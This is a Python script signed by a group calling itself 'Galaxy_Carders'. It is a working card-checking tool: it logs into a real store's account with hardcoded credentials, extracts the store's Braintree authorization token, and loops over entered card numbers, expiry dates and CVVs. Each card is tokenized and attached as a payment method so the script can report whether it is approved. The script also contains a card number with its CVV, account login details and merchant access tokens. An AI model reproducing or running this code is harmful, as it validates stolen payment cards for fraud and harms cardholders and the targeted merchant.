####b3auth By @Galaxy_Carders

import requests
from bs4 import BeautifulSoup
import html
import re
import base64

#these are the modules and libraries that you need to install first

session=requests.Session() # To maintain session

headers = {
    'authority': 'www.calipercovers.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

response = requests.get('https://www.calipercovers.com/my-account/', headers=headers)

soup=BeautifulSoup(response.text,'html.parser')

nonce=soup.find(id="woocommerce-login-nonce")

headers = {
    'authority': 'www.calipercovers.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.calipercovers.com',
    'referer': 'https://www.calipercovers.com/my-account/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

data = {
    'username': 'losthack11@gmail.com',
    'wfls-email-verification': '',
    'password': 'Losty1230@',
    'rememberme': 'forever',
    'woocommerce-login-nonce':nonce["value"],
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

response = session.post('https://www.calipercovers.com/my-account/', headers=headers, data=data)

headers = {
    'authority': 'www.calipercovers.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://www.calipercovers.com/my-account/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

response = session.get('https://www.calipercovers.com/my-account/payment-methods/', headers=headers)

headers = {
    'authority': 'www.calipercovers.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://www.calipercovers.com/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

response = session.get('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers)

#now we need to important things

html_text = response.text  # assign response text to a string variable


match = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', html_text)
if match:
    client_token = match.group(1)
else:
    print("❌ wc_braintree_client_token not found!")
    
decoded_token = base64.b64decode(client_token).decode('utf-8')

#note: client token is base64 encoded we need to decode it first and this line doing the same

match = re.search(r'authorizationFingerprint":"([^"]+)"', decoded_token)
if match:
    at = match.group(1)
else:
    print("authorizationFingerprint not found!")
    
soup=BeautifulSoup(response.text,'html.parser')

#woocommerce-add-payment-method-nonce

nonce1=soup.find(id="woocommerce-add-payment-method-nonce")

#unfortunately in some sites you cannot find the tokenizeCreditCard request but dont worry its a universal graphql request so its common in all

#copy paste this part in your code

headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {at}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '55a03f4b-9c62-406f-a058-5cebde2fc5c8',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4121997850226625',
                'expirationMonth': '10',
                'expirationYear': '2032',
                'cvv': '879',
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

tok = response.json()['data']['tokenizeCreditCard']['token']

headers = {
    'authority': 'www.calipercovers.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.calipercovers.com',
    'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key':tok,
    'braintree_cc_device_data': '{"device_session_id":"90c9cc365bac64525099c1d24548b3f4","fraud_merchant_id":null,"correlation_id":"e9e41604-1249-4dbb-8e09-ba716da4"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/dqh5nxvnwvm2qqjh"},"merchantId":"dqh5nxvnwvm2qqjh","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Bestop Premium Accessories Group","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTQxOTc5ODgsImp0aSI6IjdjNGI0NTAxLTVhYTctNDJiYi05MGIzLWRlMmUwMmY1MDA0MyIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.1y3XJXxopp4_ngXV7iP-HFopAxzDAgjMGY0ShcWwat7rjfHtpx6VXQc6unbYES6iLqHsAHpbd8sDlYKQC03GAQ","paypalClientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4042552878213091679","accessToken":"access_token$production$dqh5nxvnwvm2qqjh$d9918bec102e9ab038971ac225e91fc1","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Bestop Premium Accessories Group","clientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bestoppremiumaccessoriesgroup_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce':nonce1["value"],
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

response = session.post(
    'https://www.calipercovers.com/my-account/add-payment-method/',
    headers=headers,
    data=data,
)

# ✅ Correct headers for Braintree GraphQL (MUST be separate from site headers)
braintree_headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en;q=0.9',
    'authorization': f'Bearer {at}',  # at = authorizationFingerprint from earlier
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

# 💳 Manual card entry loop
print("\n🔁 Enter card like: 4121997850226625|10|2032|879")
print("💀 Type 'exit' to stop\n")

while True:
    card = input("💳 Enter CC: ").strip()
    if card.lower() == "exit":
        break

    match = re.match(r"(\d{12,19})\D(\d{2})\D(\d{4})\D(\d{3,4})", card)
    if not match:
        print("❌ Invalid format. Use: card|mm|yyyy|cvv")
        continue

    cc, mm, yy, cvv = match.groups()

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '55a03f4b-9c62-406f-a058-5cebde2fc5c8',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        # 🛡️ Tokenize card
        response = session.post('https://payments.braintree-api.com/graphql', headers=braintree_headers, json=json_data)
        rj = response.json()

        if 'errors' in rj:
            print(f"❌ Braintree Error: {rj['errors'][0].get('message', 'Unknown error')}")
            continue

        token = rj.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not token:
            print("❌ Failed to get token — card may be invalid.")
            continue

    except Exception as e:
        print("❌ Exception during tokenization:", e)
        continue

    # 📝 Submit to site using the token
    data['braintree_cc_nonce_key'] = token

    try:
        res = session.post('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers, data=data)
        soup = BeautifulSoup(res.text, 'html.parser')

        if 'Payment method successfully added.' in res.text:
            print(f"✅ APPROVED — {cc}|{mm}|{yy}|{cvv}")
        else:
            error_block = soup.find('ul', class_='woocommerce-error')
            if error_block:
                msg = error_block.get_text(strip=True)
                print(f"❌ Declined: {msg}")
            else:
                print("⚠️ No clear success or error message.")
    except Exception as e:
        print("❌ Final Submission Error:", e)

print("\n🚪 Exited. Done checking.")
